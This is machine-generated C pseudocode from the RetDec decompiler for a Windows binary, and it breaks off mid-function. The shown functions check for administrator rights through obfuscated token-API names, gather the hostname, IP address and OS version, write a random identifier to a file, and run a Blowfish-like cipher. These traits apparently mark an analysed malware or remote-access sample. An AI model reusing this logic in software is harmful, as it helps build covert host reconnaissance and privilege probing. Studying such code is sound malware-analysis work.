//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <arpa/inet.h>
#include <netdb.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <windows.h>

// ---------------- Integer Types Definitions -----------------

typedef int64_t int128_t;

// ------------------------ Structures ------------------------

struct _FILETIME {
    int32_t e0;
    int32_t e1;
};

struct _OSVERSIONINFOW {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int16_t e5[128];
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _WIN32_FIND_DATAW {
    int32_t e0;
    struct _FILETIME e1;
    struct _FILETIME e2;
    struct _FILETIME e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8[1];
    int16_t e9[14];
    int32_t e10;
    int32_t e11;
    int16_t e12;
};

struct hostent {
    char * e0;
    char ** e1;
    int16_t e2;
    int16_t e3;
    char ** e4;
};

struct in_addr {
    int32_t e0;
};

// ------------------------- Classes --------------------------

// .?AVBitmap@Gdiplus@@ (base classes: .?AVGdiplusBase@Gdiplus@@, .?AVImage@Gdiplus@@)
// .?AVGdiplusBase@Gdiplus@@
// .?AVImage@Gdiplus@@
// .?AV_Generic_error_category@std@@
// .?AV_Iostream_error_category@std@@ (base classes: .?AVerror_category@std@@, .?AV_Generic_error_category@std@@)
// .?AVbad_alloc@std@@ (base classes: .?AVexception@std@@)
// .?AVbad_exception@std@@ (base classes: .?AVexception@std@@)
// .?AVerror_category@std@@
// .?AVexception@std@@
// .?AVlogic_error@std@@ (base classes: .?AVexception@std@@)
// .?AVout_of_range@std@@ (base classes: .?AVexception@std@@, .?AVlogic_error@std@@)
// .?AVtype_info@@

// ------------------- Function Prototypes --------------------

int32_t _40___security_check_cookie_40_4(void);
int32_t function_404420(char a1);
int32_t function_404450(int32_t result, int32_t a2);
int32_t function_404470(int32_t a1, int32_t a2);
int32_t function_4044b0(int32_t a1, int32_t a2);
int32_t function_4044e0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_404550(void);
int32_t function_404560(int32_t result, int32_t a2);
int32_t function_4047e0(int32_t a1, uint32_t a2);
int32_t function_404980(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6);
int32_t function_404ae0(int32_t a1, int32_t a2);
int32_t function_404c70(char a1);
int32_t function_404ca0(void);
int32_t function_405ef0(void);
int32_t function_406160(void);
int32_t function_4061e0(void);
int32_t function_4063c0(void);
int32_t function_406520(void);
int32_t function_406650(int32_t a1);
int32_t function_406ab0(int32_t a1);
int32_t function_406f10(void);
int32_t function_4070d0(void);
int32_t function_407140(void);
int32_t function_409000(void);
int32_t function_409280(void);
int32_t function_409300(void);
int32_t function_409c80(void);
int32_t function_409dc0(void);
int32_t function_409e80(void);
int32_t function_40a080(void);
int32_t function_40a130(void);
int32_t function_40a340(int32_t a1, int32_t * a2, int32_t a3);
int32_t function_40a5b0(void);
int32_t function_40a860(void);
int32_t function_40ab30(int32_t a1);
int32_t function_40b62e(void);
int32_t function_40d4e3(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x404420; // 0x42359c
int32_t g2 = 46; // 0x426018
int128_t g3; // 0x426380
int128_t g4; // 0x426390
int128_t g5; // 0x4263a0
int32_t g6 = 0x404c70; // 0x427454
int128_t g7; // 0x4274f0
int128_t g8; // 0x427500
int128_t g9; // 0x427550
int128_t g10; // 0x427560
int128_t g11; // 0x427590
int128_t g12; // 0x4275e0
int128_t g13; // 0x427640
int128_t g14; // 0x427660
int128_t g15; // 0x427670
int128_t g16; // 0x4276a0
int128_t g17; // 0x4276b0
int128_t g18; // 0x427730
int128_t g19; // 0x427740
int128_t g20; // 0x427760
int128_t g21; // 0x427790
int32_t g22 = -0x44bf19b2; // 0x42a000
int32_t g23 = 0; // 0x42df0c
int32_t g24 = 0; // 0x42df10
int32_t g25 = 0; // 0x42df14
int32_t g26 = 0; // 0x42df18
int32_t g27 = 0; // 0x42df1c
int32_t g28 = 0; // 0x42df20
int32_t g29 = 0; // 0x42df24
int32_t g30 = 0; // 0x42df28
int32_t g31 = 0; // 0x42df54
int32_t g32;

// ------------------------ Functions -------------------------

// Address range: 0x404420 - 0x404442
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404420(char a1) {
    // 0x404420
    int32_t result; // 0x404420
    int32_t * v1 = (int32_t *)result; // 0x40442a
    *v1 = (int32_t)&g1;
    if ((a1 & 1) != 0) {
        // 0x404432
        _free(v1);
    }
    // 0x40443b
    return result;
}

// Address range: 0x404450 - 0x404462
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404450(int32_t result, int32_t a2) {
    // 0x404450
    *(int32_t *)result = a2;
    return result;
}

// Address range: 0x404470 - 0x4044a3
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404470(int32_t a1, int32_t a2) {
    // 0x404470
    int32_t v1; // 0x404470
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x404485
    if (v2 != *(int32_t *)(a2 + 4)) {
        // 0x40449b
        int32_t v3; // 0x404470
        return v3 & -256;
    }
    // 0x40448d
    if (v2 != *(int32_t *)a2) {
        // 0x40449b
        return v2 & -256;
    }
    // 0x404493
    return v2 & -256 | 1;
}

// Address range: 0x4044b0 - 0x4044ce
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_4044b0(int32_t a1, int32_t a2) {
    // 0x4044b0
    int32_t v1; // 0x4044b0
    if (v1 != *(int32_t *)(a1 + 4)) {
        // 0x4044c8
        return a1 & -256;
    }
    int32_t v2 = *(int32_t *)a1; // 0x4044bb
    if (v2 != a2) {
        // 0x4044c8
        return v2 & -256;
    }
    // 0x4044c2
    return v2 & -256 | 1;
}

// Address range: 0x4044e0 - 0x404550
int32_t function_4044e0(int32_t result, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    int32_t v1 = _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(a2); // 0x4044ef
    int32_t v2 = v1 != 0 ? v1 : (int32_t)"unknown error"; // 0x404501
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    int32_t v3 = v2; // 0x404518
    if (*(char *)v2 == 0) {
        // 0x40451a
        function_4047e0(v2, 0);
        return result;
    }
    v3++;
    while (*(char *)v3 != 0) {
        // 0x404534
        v3++;
    }
    // 0x40453b
    function_4047e0(v2, v3 - v2);
    return result;
}

// Address range: 0x404550 - 0x404556
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404550(void) {
    // 0x404550
    return (int32_t)"iostream";
}

// Address range: 0x404560 - 0x4045af
// From class:    .?AV_Iostream_error_category@std@@
// Type:          virtual member function
int32_t function_404560(int32_t result, int32_t a2) {
    // 0x404560
    if (a2 != 1) {
        // 0x40459f
        int32_t v1; // 0x404560
        int32_t v2; // 0x404560
        function_4044e0(result, a2, v1, 0, v2);
        return result;
    }
    // 0x404577
    *(int32_t *)(result + 20) = 15;
    *(int32_t *)(result + 16) = 0;
    *(char *)result = 0;
    function_4047e0((int32_t)"iostream stream error", 21);
    return result;
}

// Address range: 0x4047e0 - 0x404980
int32_t function_4047e0(int32_t a1, uint32_t a2) {
    // 0x4047e0
    int32_t result3; // 0x4047e0
    int32_t result; // 0x4047e0
    if (a1 != 0) {
        // 0x4047ee
        result3 = *(int32_t *)(result + 20);
    }
    // 0x404845
    int32_t v1; // bp-16, 0x4047e0
    int32_t v2; // bp-24, 0x4047e0
    uint32_t v3; // 0x4047e0
    if (a2 != -1) {
        int32_t * v4 = (int32_t *)(result + 20); // 0x40484e
        uint32_t v5 = *v4; // 0x40484e
        int32_t * v6; // 0x4047e0
        int32_t v7; // 0x4047e0
        int32_t v8; // 0x4047e0
        int32_t * v9; // 0x4047e0
        int32_t result2; // 0x4047e0
        if (v5 >= a2) {
            int32_t * v10 = (int32_t *)(result + 16);
            v6 = v10;
            v7 = v5;
            v9 = &v1;
            v8 = result3;
            if (a2 == 0) {
                // 0x404872
                *v10 = a2;
                if (v5 < 16) {
                    // 0x404888
                    *(char *)result = 0;
                    return result;
                }
                // 0x40487a
                *(char *)result3 = 0;
                return result;
            }
        } else {
            int32_t * v11 = (int32_t *)(result + 16);
            v2 = a2;
            int32_t v12; // 0x4047e0
            int32_t v13; // 0x4047e0
            int32_t v14; // 0x4047e0
            function_404980(a2, *v11, v12, v3, v14, v13);
            if (a2 == 0) {
                // 0x4048c3
                return result2;
            }
            // 0x404855
            v6 = v11;
            v7 = *v4;
            v9 = &v2;
        }
        int32_t v15 = (int32_t)v9;
        *(int32_t *)(v15 - 4) = a2;
        *(int32_t *)(v15 - 8) = a1;
        *(int32_t *)(v15 - 12) = v7 < 16 ? result : v8;
        _memcpy2();
        *v6 = a2;
        if (*v4 >= 16) {
            // 0x4048ae
            *(char *)(v8 + a2) = 0;
            return result;
        }
        // 0x4048bd
        *(char *)(result + a2) = 0;
        // 0x4048c3
        return result2;
    }
    // 0x4048cc
    _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z("string too long");
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    int32_t v16; // bp-4, 0x4047e0
    v2 = &v16;
    int32_t * v17 = (int32_t *)(result3 + 16); // 0x4048ea
    uint32_t v18 = *v17; // 0x4048ea
    if (v18 < v1) {
        // 0x40496f
        ?_Xinvalid_argument@std@@YAXPBD@Z("invalid string position");
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        return __asm_int3();
    }
    if (v18 - v1 <= v3) {
        // 0x4048fc
        *v17 = v1;
        if (*(int32_t *)(result3 + 20) < 16) {
            // 0x404913
            *(char *)(v1 + result3) = 0;
            return result3;
        }
        // 0x404905
        *(char *)(*(int32_t *)result3 + v1) = 0;
        return result3;
    }
    // 0x40491f
    if (v3 == 0) {
        // 0x4048c3
        return result3;
    }
    int32_t * v19 = (int32_t *)(result3 + 20); // 0x404923
    uint32_t v20 = *v19; // 0x404923
    int32_t v21 = result3; // 0x404927
    if (v20 >= 16) {
        // 0x404929
        v21 = *(int32_t *)result3;
    }
    int32_t v22 = v18 - v3; // 0x40492f
    int32_t v23 = v22 - v1; // 0x404937
    int32_t v24 = v20; // 0x404939
    if (v23 != 0) {
        int32_t v25 = v21 + v1; // 0x404932
        _memcpy((int32_t *)v25, (int32_t *)(v25 + v3), v23);
        v24 = *v19;
    }
    // 0x404949
    *v17 = v22;
    if (v24 >= 16) {
        // 0x404953
        *(char *)(*(int32_t *)result3 + v22) = 0;
        return result3;
    }
    // 0x404961
    *(char *)(v22 + result3) = 0;
    // 0x4048c3
    return result3;
}

// Address range: 0x404980 - 0x404acd
int32_t function_404980(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6) {
    int32_t v1 = __readfsdword(0); // bp-16, 0x404990
    __writefsdword(0, (int32_t)&v1);
    uint32_t v2 = a1 | 15; // 0x4049b5
    int32_t v3 = a1; // 0x4049bb
    int32_t v4; // 0x404980
    if (v2 < 0xfffffffe) {
        uint32_t v5 = *(int32_t *)(v4 + 20); // 0x4049c1
        uint32_t v6 = v5 / 2; // 0x4049cd
        v3 = v2;
        if (v6 > v2 / 3) {
            // 0x4049d5
            v3 = v5 > -2 - v6 ? -2 : v6 + v5;
        }
    }
    int32_t v7 = v3 + 1; // 0x4049e8
    int32_t result = 0; // 0x4049f9
    if (v7 != 0) {
        // 0x404a00
        result = _3f__3f_2_40_YAPAXI_40_Z(v7);
        if (result == 0) {
            // 0x404a10
            _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
            function_404ae0(a1 + 1, (int32_t)&g32);
            return 0x404a35;
        }
    }
    int32_t * v8 = (int32_t *)(v4 + 20);
    int32_t v9 = v7; // 0x404a46
    if (a2 != 0) {
        // 0x404a48
        v9 = *v8 < 16 ? v4 : v7;
        _memcpy2();
    }
    // 0x404a90
    if (*v8 >= 16) {
        // 0x404a96
        _free((int32_t *)v9);
    }
    // 0x404aa0
    *(char *)v4 = 0;
    *(int32_t *)v4 = result;
    *v8 = v3;
    *(int32_t *)(v4 + 16) = a2;
    *(char *)((v3 < 16 ? v4 : result) + a2) = 0;
    __writefsdword(0, v1);
    return result;
}

// Address range: 0x404ae0 - 0x404c68
int32_t function_404ae0(int32_t a1, int32_t a2) {
    // 0x404ae0
    if (a2 == 0) {
        // 0x404b00
        return 0;
    }
    int32_t result = _3f__3f_2_40_YAPAXI_40_Z(a2); // 0x404af2
    if (result != 0) {
        // 0x404b00
        return result;
    }
    // 0x404b06
    _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    __asm_int3();
    if (a1 != 0) {
        // 0x404b4a
        *(int32_t *)a1 = 0;
    }
    int32_t v1 = _rand(); // 0x404b50
    int32_t v2; // 0x404ae0
    int32_t v3 = v2 + 16 & -16; // 0x404b63
    int32_t * v4 = _malloc((v3 | 1) + (int32_t)((0x100000000 * (int64_t)(v1 >> 31) | (int64_t)v1) % 15)); // 0x404b79
    if (v4 == NULL) {
        // 0x404b8d
        return _40___security_check_cookie_40_4();
    }
    // 0x404b9e
    _memset(v4, v3 - v2, v3);
    _memcpy2();
    // UNREACHABLE
}

// Address range: 0x404c70 - 0x404c99
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404c70(char a1) {
    // 0x404c70
    int32_t result; // 0x404c70
    int32_t * v1 = (int32_t *)result; // 0x404c79
    *v1 = (int32_t)&g6;
    GdipDisposeImage((int32_t *)*(int32_t *)(result + 4));
    if ((a1 & 1) != 0) {
        // 0x404c8b
        GdipFree(v1);
    }
    // 0x404c92
    return result;
}

// Address range: 0x404ca0 - 0x404cec
// From class:    .?AVBitmap@Gdiplus@@
// Type:          virtual member function
int32_t function_404ca0(void) {
    int32_t v1 = 0; // bp-8, 0x404ca7
    int32_t v2; // 0x404ca0
    int32_t v3 = GdipCloneImage((int32_t *)*(int32_t *)(v2 + 4), (int32_t **)&v1); // 0x404cb5
    if (v3 != 0) {
        // 0x404cbf
        *(int32_t *)(v2 + 8) = v3;
    }
    int32_t * v4 = GdipAlloc(16); // 0x404cc4
    if (v4 == NULL) {
        // 0x404ce5
        return 0;
    }
    int32_t result = (int32_t)v4; // 0x404cc4
    *v4 = (int32_t)&g6;
    *(int32_t *)(result + 4) = v1;
    *(int32_t *)(result + 8) = *(int32_t *)(v2 + 8);
    return result;
}

// Address range: 0x405ef0 - 0x406155
int32_t function_405ef0(void) {
    char lpBuffer = 0; // bp-164, 0x405f0d
    int32_t v1; // bp-163, 0x405ef0
    _memset(&v1, 0, 44);
    int32_t v2; // bp-115, 0x405ef0
    _memset(&v2, 0, 99);
    char lpFileName = 0; // bp-216, 0x405f31
    int32_t v3; // bp-215, 0x405ef0
    _memset(&v3, 0, 49);
    int32_t v4 = 0x35545039; // bp-116, 0x405f43
    int32_t v5 = &v4; // 0x405f6d
    int32_t v6 = v5; // 0x405f70
    while (*(char *)v6 != 0) {
        // 0x405f72
        v6++;
    }
    // 0x405f79
    int32_t v7; // bp-217, 0x405ef0
    int32_t v8 = &v7; // 0x405f81
    v8++;
    char * v9 = (char *)v8;
    while (*v9 != 0) {
        // 0x405f82
        v8++;
        v9 = (char *)v8;
    }
    uint32_t v10 = v6 - v5; // 0x405f7f
    uint32_t v11 = v10 / 4; // 0x405f92
    __asm_rep_movsd_memcpy(v9, (char *)&v4, v11);
    bool v12; // 0x405ef0
    int32_t v13 = v12 ? -4 : 4; // 0x405f95
    char * v14 = (char *)(v8 + v11 * v13); // 0x405fae
    __asm_rep_movsb_memcpy(v14, v14, v10 & 3);
    int32_t * fileHandle = CreateFileA(&lpFileName, (int32_t)&g32, (int32_t)&g32, (struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t)&g32, &g32); // 0x405fb7
    int32_t lpNumberOfBytesRead; // bp-344, 0x405ef0
    if (fileHandle != (int32_t *)-1) {
        // 0x40611f
        ReadFile(fileHandle, (int32_t *)&lpBuffer, 40, &lpNumberOfBytesRead, NULL);
        CloseHandle(fileHandle);
        return _40___security_check_cookie_40_4();
    }
    int32_t * fileHandle2 = CreateFileA(&lpFileName, 4, 1, NULL, 2, 128, NULL); // 0x405fdb
    int32_t v15; // bp-67, 0x405ef0
    _memset(&v15, 0, 49);
    int128_t v16; // 0x405ef0
    __asm_movdqu_10(v16, __asm_movdqa(g19));
    GetModuleHandleA("Advapi32.dll");
    function_407140();
    int32_t v17; // bp-336, 0x405ef0
    int32_t v18 = &v17; // 0x40603b
    while (*(char *)v18 != 0) {
        // 0x406040
        v18++;
    }
    // 0x406047
    int32_t v19; // bp-335, 0x405ef0
    int32_t v20 = v18 - (int32_t)&v19; // 0x406047
    if (v20 != 0) {
        int32_t v21 = 0;
        int32_t v22; // bp-4, 0x405ef0
        int32_t v23; // 0x405ef0
        if (v21 != 0 && v21 != v20 - 1) {
            // 0x40605b
            v23 = v21 + (int32_t)&v22;
            *(char *)(v23 - 161) = *(char *)(v23 - 332);
        }
        int32_t v24 = v21 + 1; // 0x406069
        while (v24 != v20) {
            // 0x406050
            v21 = v24;
            if (v21 != 0 && v21 != v20 - 1) {
                // 0x40605b
                v23 = v21 + (int32_t)&v22;
                *(char *)(v23 - 161) = *(char *)(v23 - 332);
            }
            // 0x406069
            v24 = v21 + 1;
        }
    }
    // 0x40606e
    _srand(GetTickCount());
    int32_t v25 = _rand(); // 0x40607a
    int32_t v26 = 0; // bp-16, 0x40608c
    __itoa((int32_t)((0x100000000 * (int64_t)(v25 >> 31) | (int64_t)v25) % 0xc350) + 0x2710, (char *)&v26, 16);
    int32_t v27 = &v26; // 0x4060a4
    int32_t v28 = v27; // 0x4060ac
    while (*(char *)v28 != 0) {
        // 0x4060b0
        v28++;
    }
    // 0x4060b7
    int32_t v29; // bp-165, 0x405ef0
    int32_t v30 = &v29; // 0x4060bf
    v30++;
    char * v31 = (char *)v30;
    while (*v31 != 0) {
        // 0x4060c0
        v30++;
        v31 = (char *)v30;
    }
    uint32_t v32 = v28 - v27; // 0x4060bd
    uint32_t v33 = v32 / 4; // 0x4060ca
    __asm_rep_movsd_memcpy(v31, (char *)&v26, v33);
    char * v34 = (char *)(v30 + v33 * v13); // 0x4060d4
    __asm_rep_movsb_memcpy(v34, v34, v32 & 3);
    int32_t v35 = &lpBuffer; // 0x4060df
    while (*(char *)v35 != 0) {
        // 0x4060e0
        v35++;
    }
    // 0x4060e7
    WriteFile(fileHandle2, (int32_t *)&lpBuffer, v35 - (int32_t)&v1, &lpNumberOfBytesRead, NULL);
    CloseHandle(fileHandle2);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406160 - 0x4061dd
int32_t function_406160(void) {
    // 0x406160
    int128_t v1; // 0x406160
    int128_t v2; // 0x406160
    __asm_movdqu_10(v2, __asm_xorps(v1, v1));
    GetModuleHandleA(NULL);
    __asm_movdqu_10(0, __asm_movdqa(g14));
    function_407140();
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4061e0 - 0x4063b3
int32_t function_4061e0(void) {
    // 0x4061e0
    int32_t v1; // bp-227, 0x4061e0
    _memset(&v1, 0, 199);
    int128_t v2; // 0x4061e0
    int128_t v3; // 0x4061e0
    __asm_movdqu_10(v3, __asm_xorps(v2, v2));
    function_407140();
    OpenProcess(0x1fffff, false, GetCurrentProcessId());
    GetModuleHandleA("Advapi32.dll");
    __asm_movdqu_10(71, __asm_movdqa(0x6e656b6f54737365636f72506e65704f));
    function_407140();
    __asm_movdqu_10(71, __asm_movdqa(0x74616d726f666e496e656b6f54746547));
    function_407140();
    int32_t v4; // 0x4061e0
    if (v4 != 0) {
        // 0x40630b
        _printf("ok");
    }
    // 0x406318
    LoadLibraryW(L"shell32.dll");
    GetModuleHandleW(L"shell32.dll");
    int32_t v5; // bp-229, 0x4061e0
    if (function_407140() == 0) {
        int32_t v6 = &v5; // 0x406394
        while (*(char *)(v6 + 1) != 0) {
            // 0x406395
            v6++;
        }
        // 0x40639f
        return _40___security_check_cookie_40_4();
    }
    // 0x406359
    _printf("user is admin");
    int32_t v7 = &v5; // 0x40636d
    while (*(char *)(v7 + 1) != 0) {
        // 0x406370
        v7++;
    }
    // 0x40637a
    return _40___security_check_cookie_40_4();
}

// Address range: 0x4063c0 - 0x406519
int32_t function_4063c0(void) {
    // 0x4063c0
    int128_t v1; // 0x4063c0
    int128_t v2 = __asm_xorps(v1, v1); // 0x4063e6
    int128_t v3; // 0x4063c0
    __asm_movdqu_10(v3, v2);
    int32_t * v4 = NULL; // bp-16, 0x4063f5
    _memset(NULL, 0, (int32_t)&g32);
    int32_t lpVersionInformation = 276; // bp-332, 0x406408
    int128_t v5; // 0x4063c0
    __asm_movdqu_10(v5, __asm_xorps(v2, v2));
    int32_t * moduleHandle = GetModuleHandleA("kernel32.dll"); // 0x40642d
    char lpProcName = 71; // bp-36, 0x406436
    GetProcAddress(moduleHandle, &lpProcName);
    GetVersionExW((struct _OSVERSIONINFOW *)&lpVersionInformation);
    int32_t v6; // 0x4063c0
    __itoa(v6, (char *)&v4, 10);
    int32_t v7 = (int32_t)&v4; // 0x40647c
    int32_t v8 = v7; // 0x406482
    while (*(char *)v8 != 0) {
        // 0x406484
        v8++;
    }
    // 0x40648b
    int32_t v9; // bp-57, 0x4063c0
    int32_t v10 = &v9; // 0x406490
    int32_t v11 = v10; // 0x406490
    v11++;
    char * v12 = (char *)v11;
    while (*v12 != 0) {
        // 0x406491
        v11++;
        v12 = (char *)v11;
    }
    uint32_t v13 = v8 - v7; // 0x40648e
    uint32_t v14 = v13 / 4; // 0x40649b
    __asm_rep_movsd_memcpy(v12, (char *)&v4, v14);
    bool v15; // 0x4063c0
    int32_t v16 = v15 ? -4 : 4; // 0x40649e
    char * v17 = (char *)(v11 + v14 * v16); // 0x4064a5
    __asm_rep_movsb_memcpy(v17, v17, v13 & 3);
    int32_t v18 = v10; // 0x4064ab
    v18++;
    while (*(char *)v18 != 0) {
        // 0x4064b0
        v18++;
    }
    // 0x4064ba
    *(int32_t *)v18 = 0x76696d;
    int32_t v19; // 0x4063c0
    __itoa(v19, (char *)&v4, 10);
    int32_t v20 = v7;
    int32_t v21 = v20 + 1; // 0x4064e2
    while (*(char *)v20 != 0) {
        // 0x4064e0
        v20 = v21;
        v21 = v20 + 1;
    }
    int32_t v22 = v10 + 1; // 0x4064f0
    char * v23 = (char *)v22;
    int32_t v24 = v22; // 0x4064f6
    while (*v23 != 0) {
        // 0x4064f0
        v22 = v24 + 1;
        v23 = (char *)v22;
        v24 = v22;
    }
    uint32_t v25 = v21 - v7; // 0x4064ea
    uint32_t v26 = v25 / 4; // 0x4064fd
    __asm_rep_movsd_memcpy(v23, (char *)&v4, v26);
    char * v27 = (char *)(v22 + v26 * v16); // 0x406507
    __asm_rep_movsb_memcpy(v27, v27, v25 & 3);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406520 - 0x406594
int32_t function_406520(void) {
    struct in_addr in; // 0x406580
    // 0x406520
    int32_t name; // bp-88, 0x406520
    if (gethostname((char *)&name, 80) == -1) {
        // 0x406541
        return _40___security_check_cookie_40_4();
    }
    struct hostent * v1 = gethostbyname((char *)&name); // 0x406558
    if (v1 == NULL) {
        // 0x406562
        return _40___security_check_cookie_40_4();
    }
    int32_t v2 = *(int32_t *)*(int32_t *)((int32_t)v1 + 12); // 0x406578
    if (v2 != 0) {
        // 0x40657e
        in = (struct {int32_t e0;}){
            .e0 = 0
        };
        in.e0 = *(int32_t *)v2;
        inet_ntoa(in);
    }
    // 0x406586
    return _40___security_check_cookie_40_4();
}

// Address range: 0x406650 - 0x406ab0
int32_t function_406650(int32_t a1) {
    // 0x406650
    int32_t v1; // 0x406650
    unsigned char v2 = *(char *)(v1 + 1); // 0x406662
    unsigned char v3 = *(char *)(v1 + 2); // 0x40666b
    unsigned char v4 = *(char *)(v1 + 3); // 0x406674
    int32_t v5 = *(int32_t *)a1; // 0x40667d
    uint32_t v6 = (256 * (256 * (256 * v1 & 0xff00 | (int32_t)v2) | (int32_t)v3) | (int32_t)v4) ^ v5; // 0x40667d
    int32_t v7 = a1 + 1096; // 0x40668f
    int32_t v8 = *(int32_t *)((v6 / 0x4000 & 1020) + v7); // 0x40668f
    int32_t v9 = a1 + 72; // 0x406696
    int32_t v10 = *(int32_t *)(4 * v6 / 0x1000000 + v9); // 0x406696
    unsigned char v11 = *(char *)(v1 + 4); // 0x40669c
    int32_t v12 = a1 + 2120; // 0x4066ab
    int32_t v13 = *(int32_t *)((v6 / 64 & 1020) + v12); // 0x4066ab
    int32_t v14 = a1 + 3144; // 0x4066b5
    int32_t v15 = *(int32_t *)((4 * v6 & 1020) + v14); // 0x4066b5
    unsigned char v16 = *(char *)(v1 + 5); // 0x4066bc
    unsigned char v17 = *(char *)(v1 + 6); // 0x4066c2
    unsigned char v18 = *(char *)(v1 + 7); // 0x4066cb
    int32_t v19 = *(int32_t *)(a1 + 4); // 0x4066d6
    uint32_t v20 = v19 ^ (v13 ^ v10 + v8) + v15 ^ (256 * (256 * (256 * (int32_t)v11 | (int32_t)v16) | (int32_t)v17) | (int32_t)v18); // 0x4066d6
    int32_t v21 = *(int32_t *)(4 * v20 / 0x1000000 + v9); // 0x4066f0
    int32_t v22 = *(int32_t *)((v20 / 64 & 1020) + v12); // 0x4066fe
    int32_t v23 = *(int32_t *)((4 * v20 & 1020) + v14); // 0x406708
    int32_t v24 = *(int32_t *)(a1 + 8); // 0x406711
    uint32_t v25 = (v21 + *(int32_t *)((v20 / 0x4000 & 1020) + v7) ^ v22) + v23 ^ v6 ^ v24; // 0x406714
    int32_t v26 = *(int32_t *)(4 * v25 / 0x1000000 + v9); // 0x40672d
    int32_t v27 = *(int32_t *)((v25 / 64 & 1020) + v12); // 0x40673b
    int32_t v28 = *(int32_t *)((4 * v25 & 1020) + v14); // 0x406745
    int32_t v29 = *(int32_t *)(a1 + 12); // 0x40674e
    uint32_t v30 = (v26 + *(int32_t *)((v25 / 0x4000 & 1020) + v7) ^ v27) + v28 ^ v20 ^ v29; // 0x406751
    int32_t v31 = *(int32_t *)(4 * v30 / 0x1000000 + v9); // 0x40676a
    int32_t v32 = *(int32_t *)((v30 / 64 & 1020) + v12); // 0x406778
    int32_t v33 = *(int32_t *)((4 * v30 & 1020) + v14); // 0x406782
    int32_t v34 = *(int32_t *)(a1 + 16); // 0x40678b
    uint32_t v35 = (v31 + *(int32_t *)((v30 / 0x4000 & 1020) + v7) ^ v32) + v33 ^ v25 ^ v34; // 0x40678e
    int32_t v36 = *(int32_t *)(4 * v35 / 0x1000000 + v9); // 0x4067a7
    int32_t v37 = *(int32_t *)((v35 / 64 & 1020) + v12); // 0x4067b5
    int32_t v38 = *(int32_t *)((4 * v35 & 1020) + v14); // 0x4067bf
    int32_t v39 = *(int32_t *)(a1 + 20); // 0x4067c8
    uint32_t v40 = (v36 + *(int32_t *)((v35 / 0x4000 & 1020) + v7) ^ v37) + v38 ^ v30 ^ v39; // 0x4067cb
    int32_t v41 = *(int32_t *)(4 * v40 / 0x1000000 + v9); // 0x4067e4
    int32_t v42 = *(int32_t *)((v40 / 64 & 1020) + v12); // 0x4067f2
    int32_t v43 = *(int32_t *)((4 * v40 & 1020) + v14); // 0x4067fc
    int32_t v44 = *(int32_t *)(a1 + 24); // 0x406805
    uint32_t v45 = (v41 + *(int32_t *)((v40 / 0x4000 & 1020) + v7) ^ v42) + v43 ^ v35 ^ v44; // 0x406808
    int32_t v46 = *(int32_t *)(4 * v45 / 0x1000000 + v9); // 0x406821
    int32_t v47 = *(int32_t *)((v45 / 64 & 1020) + v12); // 0x40682f
    int32_t v48 = *(int32_t *)((4 * v45 & 1020) + v14); // 0x406839
    int32_t v49 = *(int32_t *)(a1 + 28); // 0x406842
    uint32_t v50 = (v46 + *(int32_t *)((v45 / 0x4000 & 1020) + v7) ^ v47) + v48 ^ v40 ^ v49; // 0x406845
    int32_t v51 = *(int32_t *)(4 * v50 / 0x1000000 + v9); // 0x40685e
    int32_t v52 = *(int32_t *)((v50 / 64 & 1020) + v12); // 0x40686c
    int32_t v53 = *(int32_t *)((4 * v50 & 1020) + v14); // 0x406876
    int32_t v54 = *(int32_t *)(a1 + 32); // 0x40687f
    uint32_t v55 = (v51 + *(int32_t *)((v50 / 0x4000 & 1020) + v7) ^ v52) + v53 ^ v45 ^ v54; // 0x406882
    int32_t v56 = *(int32_t *)(4 * v55 / 0x1000000 + v9); // 0x40689b
    int32_t v57 = *(int32_t *)((v55 / 64 & 1020) + v12); // 0x4068a9
    int32_t v58 = *(int32_t *)((4 * v55 & 1020) + v14); // 0x4068b3
    int32_t v59 = *(int32_t *)(a1 + 36); // 0x4068bc
    uint32_t v60 = (v56 + *(int32_t *)((v55 / 0x4000 & 1020) + v7) ^ v57) + v58 ^ v50 ^ v59; // 0x4068bf
    int32_t v61 = *(int32_t *)(4 * v60 / 0x1000000 + v9); // 0x4068d8
    int32_t v62 = *(int32_t *)((v60 / 64 & 1020) + v12); // 0x4068e6
    int32_t v63 = *(int32_t *)((4 * v60 & 1020) + v14); // 0x4068f0
